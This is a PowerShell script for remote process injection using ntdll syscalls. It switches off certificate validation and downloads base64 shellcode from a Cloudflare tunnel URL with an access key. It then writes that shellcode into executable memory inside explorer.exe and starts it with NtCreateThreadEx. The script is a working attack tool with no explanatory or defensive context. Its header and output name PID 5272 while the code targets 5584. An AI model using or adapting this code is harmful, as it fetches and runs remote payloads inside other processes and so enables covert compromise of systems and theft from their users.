# Syscall Injection v3 - Inject into PID 5272
# Remote process injection using NTDLL syscalls

$code = @'
using System;
using System.Runtime.InteropServices;

public class N {
    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(IntPtr ph, ref IntPtr addr, IntPtr zero, ref uint size, uint type, uint protect);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(IntPtr ph, IntPtr addr, byte[] buf, uint len, ref uint written);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(ref IntPtr th, uint access, IntPtr oa, IntPtr ph, IntPtr start, IntPtr param, bool suspended, uint stack, uint reserve, uint commit, IntPtr attr);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
}
'@

Add-Type -TypeDefinition $code

# Trust self-signed certificate for HTTPS
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Get shellcode
$sc = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://attention-launches-kind-commonly.trycloudflare.com/payloads/shellcode.txt?key=X7k9mP2vL4qR8nT1'))

# Open target process - explorer (PID 5584)
$h = [N]::OpenProcess(0x1F0FFF, $false, 5584)
if ($h -eq [IntPtr]::Zero) { "Failed to open process"; exit }

$addr = [IntPtr]::Zero
$sz = [uint32]$sc.Length

# Allocate
[N]::NtAllocateVirtualMemory($h, [ref]$addr, [IntPtr]::Zero, [ref]$sz, 0x3000, 0x40)

# Write
$w = [uint32]0
[N]::NtWriteVirtualMemory($h, $addr, $sc, [uint32]$sc.Length, [ref]$w)

# Execute
$t = [IntPtr]::Zero
[N]::NtCreateThreadEx([ref]$t, 0x1FFFFF, [IntPtr]::Zero, $h, $addr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)

[N]::CloseHandle($h)
"Injected into 5272"
